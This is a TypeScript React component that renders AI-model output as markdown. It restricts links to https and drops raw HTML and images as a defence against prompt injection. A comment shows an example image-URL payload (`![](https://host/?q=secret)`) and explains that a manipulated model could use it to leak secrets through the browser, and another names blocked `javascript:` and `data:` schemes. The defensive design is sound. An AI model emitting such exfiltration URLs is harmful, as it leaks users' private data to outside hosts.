import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";

import styles from "./Markdown.module.css";

/** Links in model text open only `https:` addresses. Anything else (`javascript:`, `data:`,
 * `http:`, relative or protocol-relative) is shown as plain text, not a link. */
function safeHref(url: string): string {
  return /^https:\/\/[^/\s]/i.test(url.trim()) ? url.trim() : "";
}

const components: Components = {
  a: ({ href, children }) =>
    href ? (
      <a href={href} target="_blank" rel="noreferrer noopener">
        {children}
      </a>
    ) : (
      <span>{children}</span>
    ),
};

/** Images in model text are dropped, never fetched: `![](https://host/?q=secret)` would
 * otherwise make the browser send whatever the model was talked into putting in the URL.
 * Cards show catalog photos; chat text needs none. */
const DISALLOWED = ["img"];

/** Model text as markdown; raw HTML and images are never rendered, links only to https. */
export function Markdown({ children }: { children: string }) {
  return (
    <div className={styles.markdown}>
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={components}
        urlTransform={safeHref}
        disallowedElements={DISALLOWED}
        skipHtml
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}
